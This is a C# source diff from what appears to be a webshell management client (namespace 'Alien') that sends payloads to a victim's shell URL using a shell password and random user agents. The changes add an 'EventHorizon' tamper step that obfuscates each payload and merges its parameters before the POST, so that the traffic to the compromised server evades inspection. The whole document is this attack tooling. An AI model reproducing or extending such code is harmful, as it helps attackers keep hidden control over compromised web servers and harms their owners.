@@ -12,6 +12,7 @@ using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Net;
 using System.Text.RegularExpressions;
+using System.Text.Json.Nodes;
 
 namespace Alien
 {
@@ -258,7 +259,7 @@ namespace Alien
             m_clnt = new HttpClient(handler)
             {
                 BaseAddress = new Uri(m_victim.ShellURL),
-                Timeout = TimeSpan.FromMilliseconds(5000),
+                Timeout = TimeSpan.FromMilliseconds(10000),
             };
 
             string szRandomUA = clsEzData.fnRandomUserAgent();
@@ -517,6 +518,22 @@ namespace Alien
                 else
                 {
                     // OneShell
+
+                    var config = m_victim.m_ShellConfig;
+                    if (config.bEHEnable)
+                    {
+                        var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
+                        if (dicParam == null)
+                            throw new Exception("Invalid JSON string");
+
+                        string[] split = szPayloadData.Split('=');
+                        string szLoader = split[1];
+
+                        szPayloadData = await m_tamper.fnObfuscate(config.szEventHorizonScript, szLoader, dicParam) ?? string.Empty;
+                        if (!config.bRaw)
+                            szPayloadData = split[0] + "=" + szPayloadData;
+                    }
+
                     content = new StringContent(
                         szPayloadData,
                         Encoding.GetEncoding(m_victim.ShellEncoding),
@@ -730,7 +747,7 @@ namespace Alien
         public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
         {
             string szSplitter = clsEzData.fnszGenerateRandomStr();
-            string szPayload = fnGetPayload(szPayloadName, szSplitter);
+            string szPayload = await fnGetPayload(szPayloadName, szSplitter);
 
             if (szPayload.Contains("[ENCODING]"))
                 szPayload = szPayload.Replace("[ENCODING]", m_victim.ShellEncoding);
@@ -745,8 +762,14 @@ namespace Alien
             }
             else
             {
+                //OneShell
+
                 for (int i = 0; i < asParams.Length; i++)
                     asParams[i] = $"z{i}={Uri.EscapeDataString(clsEzData.fnszStre2b64(asParams[i]))}";
+
+                var config = m_victim.m_ShellConfig;
+                if (config.bEHEnable)
+                    szPayload = $"{m_victim.ShellPassword}=" + clsTamper.fnMergePayloadToOne(szPayload, asParams, config.language);
 
                 string szPayloadMethod = m_victim.m_ShellConfig.szMethod;
 
@@ -761,7 +784,7 @@ namespace Alien
                     .Replace("%5BENCODING%5D", Uri.EscapeDataString(m_victim.ShellEncoding))
                     .Replace(" ", "%20");
 
-                szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";
+                szPayload = $"{m_victim.ShellPassword}={szLoader}" + (config.bEHEnable ? string.Empty : $"&{szParams}");
             }
 
             return await fnHttpPOST(szPayload, szSplitter);
@@ -770,7 +793,7 @@ namespace Alien
         public async Task<byte[]> fnabSendPayload(string szPayloadName, string[] asParams)
         {
             string szSplitter = clsEzData.fnszGenerateRandomStr();
-            string szPayload = fnGetPayload(szPayloadName, szSplitter);
+            string szPayload = await fnGetPayload(szPayloadName, szSplitter);
 
             for (int i = 0; i < asParams.Length; i++)
                 asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
@@ -791,7 +814,7 @@ namespace Alien
         /// </summary>
         /// <param name="szPayloadName">Payload name, also represents to file name.</param>
         /// <returns>Payload content</returns>
-        private string fnGetPayload(string szPayloadName, string szSplitter)
+        private async Task<string> fnGetPayload(string szPayloadName, string szSplitter)
         {
             string szSuffix = m_dicSuffix[m_victim.ShellLanguage];
             string szPayloadFilePath = Path.Combine(new string[]
@@ -822,7 +845,26 @@ namespace Alien
 
                 if (m_dicWrapper.ContainsKey(m_victim.ShellLanguage))
                 {
+                    var config = m_victim.m_ShellConfig;
                     string szEncryptor = string.Empty;
+                    if (config.bEHEnable && !string.IsNullOrEmpty(config.szEventHorizonScript))
+                    {
+                        if (m_tamper == null)
+                            throw new Exception("Tamper object is null");
+
+                        Dictionary<string, object>? dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
+                        if (dicParam == null)
+                            dicParam = new Dictionary<string, object>();
+
+                        dicParam["script"] = Enum.GetName(typeof(enLanguage), config.language);
+
+                        szEncryptor = await m_tamper.fnGetObfuscator(config.szEventHorizonScript, dicParam);
+                        if (string.IsNullOrEmpty(szEncryptor))
+                            szEncryptor = string.Empty;
+
+                        MessageBox.Show(szEncryptor);
+                    }
+
                     string szMethod = m_victim.m_ShellConfig.szMethod;
                     szPayload = m_dicWrapper[m_victim.ShellLanguage](szMethod)(szPayload, szEncryptor);
                 }
